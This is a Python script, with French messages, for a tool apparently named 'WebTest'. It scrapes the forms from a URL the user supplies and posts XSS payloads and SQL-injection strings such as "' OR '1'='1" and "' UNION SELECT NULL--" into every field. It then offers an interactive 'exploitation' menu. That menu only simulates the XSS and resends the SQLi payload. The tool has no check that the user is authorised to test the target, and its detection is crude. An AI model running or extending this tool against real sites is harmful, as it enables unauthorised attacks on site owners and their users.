import requests
import sys
import time
import socket
from colorama import init, Fore, Style
from bs4 import BeautifulSoup
from urllib.parse import urljoin, parse_qs, urlparse

def print_banner():
    banner = f"""
{Fore.RED}╔═══════════════════════════════════════════════════════════════════════════╗
║                                                                           ║
║   ██╗    ██╗███████╗██████╗ ████████╗███████╗███████╗████████╗          ║
║   ██║    ██║██╔════╝██╔══██╗╚══██╔══╝██╔════╝██╔════╝╚══██╔══╝          ║
║   ██║ █╗ ██║█████╗  ██████╔╝   ██║   █████╗  ███████╗   ██║             ║
║   ██║███╗██║██╔══╝  ██╔══██╗   ██║   ██╔══╝  ╚════██║   ██║             ║
║   ╚███╔███╔╝███████╗██████╔╝   ██║   ███████╗███████║   ██║             ║
║    ╚══╝╚══╝ ╚══════╝╚═════╝    ╚═╝   ╚══════╝╚══════╝   ╚═╝             ║
║                                                                           ║
║                     Tests de Sécurité Web Avancés                        ║
║                                                                           ║
╚═══════════════════════════════════════════════════════════════════════════╝{Style.RESET_ALL}
"""
    print(banner)

def get_ip(url):
    try:
        domain = urlparse(url).netloc
        ip = socket.gethostbyname(domain)
        print(f"{Fore.GREEN}[+] IP du site: {ip}{Style.RESET_ALL}")
        return ip
    except Exception as e:
        print(f"{Fore.RED}[-] Impossible de résoudre l'IP: {str(e)}{Style.RESET_ALL}")
        return None

def find_forms(url):
    try:
        print(f"{Fore.YELLOW}[*] Recherche des formulaires...{Style.RESET_ALL}")
        response = requests.get(url)
        soup = BeautifulSoup(response.text, 'html.parser')
        forms = soup.find_all('form')
        print(f"{Fore.GREEN}[+] {len(forms)} formulaire(s) trouvé(s){Style.RESET_ALL}")
        return forms
    except:
        print(f"{Fore.RED}[-] Erreur lors de la recherche des formulaires{Style.RESET_ALL}")
        return []

def test_xss(url, form):
    print(f"\n{Fore.CYAN}[*] Test des vulnérabilités XSS en direct...{Style.RESET_ALL}")
    payloads = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert('XSS')>",
        "javascript:alert('XSS')"
    ]
    
    inputs = form.find_all(['input', 'textarea'])
    for input_field in inputs:
        for payload in payloads:
            data = {i.get('name'): payload for i in inputs if i.get('name')}
            try:
                print(f"{Fore.YELLOW}[*] Test XSS sur {input_field.get('name')} avec payload: {payload}{Style.RESET_ALL}")
                response = requests.post(url, data=data)
                if payload in response.text:
                    print(f"{Fore.RED}[!] Vulnérabilité XSS trouvée!{Style.RESET_ALL}")
                    return True, input_field.get('name'), payload
            except:
                continue
    return False, None, None

def test_sqli(url, form):
    print(f"\n{Fore.CYAN}[*] Test des vulnérabilités SQLi en direct...{Style.RESET_ALL}")
    payloads = [
        "' OR '1'='1",
        "1' OR '1'='1",
        "' UNION SELECT NULL--",
        "admin' --",
        "' OR 1=1#"
    ]
    
    inputs = form.find_all(['input', 'textarea'])
    for input_field in inputs:
        for payload in payloads:
            data = {i.get('name'): payload for i in inputs if i.get('name')}
            try:
                print(f"{Fore.YELLOW}[*] Test SQLi sur {input_field.get('name')} avec payload: {payload}{Style.RESET_ALL}")
                response = requests.post(url, data=data)
                if any(err in response.text.lower() for err in ['sql', 'mysql', 'oracle', 'syntax']):
                    print(f"{Fore.RED}[!] Vulnérabilité SQLi trouvée!{Style.RESET_ALL}")
                    return True, input_field.get('name'), payload
            except:
                continue
    return False, None, None

def exploit_vulnerability(url, vuln_type, input_field, payload):
    print(f"\n{Fore.RED}[!] Exploitation de la vulnérabilité {vuln_type}{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}[*] Champ vulnérable: {input_field}{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}[*] Payload utilisé: {payload}{Style.RESET_ALL}")
    
    if vuln_type == "XSS":
        print(f"{Fore.GREEN}[+] Simulation de l'exécution du script:{Style.RESET_ALL}")
        print(f"{Fore.CYAN}    → Le code JavaScript s'exécuterait dans le navigateur de la victime{Style.RESET_ALL}")
        
    elif vuln_type == "SQLi":
        print(f"{Fore.GREEN}[+] Tentative d'extraction de données:{Style.RESET_ALL}")
        try:
            data = {input_field: payload}
            response = requests.post(url, data=data)
            print(f"{Fore.CYAN}    → Réponse du serveur: {len(response.text)} bytes{Style.RESET_ALL}")
        except Exception as e:
            print(f"{Fore.RED}[-] Erreur lors de l'exploitation: {str(e)}{Style.RESET_ALL}")

def main():
    init()
    print_banner()
    
    if len(sys.argv) != 2:
        url = input(f"{Fore.CYAN}Entrez l'URL du site à tester: {Style.RESET_ALL}")
    else:
        url = sys.argv[1]

    print(f"\n{Fore.YELLOW}[*] Démarrage de l'analyse de {url}{Style.RESET_ALL}")
    
    ip = get_ip(url)
    if not ip:
        return
        
    forms = find_forms(url)
    if not forms:
        print(f"{Fore.RED}[-] Aucun formulaire trouvé{Style.RESET_ALL}")
        return
        
    vulnerabilities = []
    
    for form in forms:
        xss_found, xss_field, xss_payload = test_xss(url, form)
        if xss_found:
            vulnerabilities.append(("XSS", xss_field, xss_payload))
            
        sqli_found, sqli_field, sqli_payload = test_sqli(url, form)
        if sqli_found:
            vulnerabilities.append(("SQLi", sqli_field, sqli_payload))
    
    if vulnerabilities:
        print(f"\n{Fore.GREEN}[+] Vulnérabilités trouvées:{Style.RESET_ALL}")
        for i, (vuln_type, field, payload) in enumerate(vulnerabilities, 1):
            print(f"{Fore.YELLOW}{i}. {vuln_type} dans le champ '{field}'{Style.RESET_ALL}")
        
        while True:
            choice = input(f"\n{Fore.CYAN}Choisissez une vulnérabilité à exploiter (numéro) ou 'q' pour quitter: {Style.RESET_ALL}")
            if choice.lower() == 'q':
                break
            try:
                vuln_index = int(choice) - 1
                if 0 <= vuln_index < len(vulnerabilities):
                    exploit_vulnerability(url, *vulnerabilities[vuln_index])
                else:
                    print(f"{Fore.RED}[-] Numéro invalide{Style.RESET_ALL}")
            except ValueError:
                print(f"{Fore.RED}[-] Choix invalide{Style.RESET_ALL}")
    else:
        print(f"\n{Fore.GREEN}[+] Aucune vulnérabilité trouvée{Style.RESET_ALL}")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}[-] Programme interrompu par l'utilisateur{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.RED}[-] Erreur: {str(e)}{Style.RESET_ALL}")
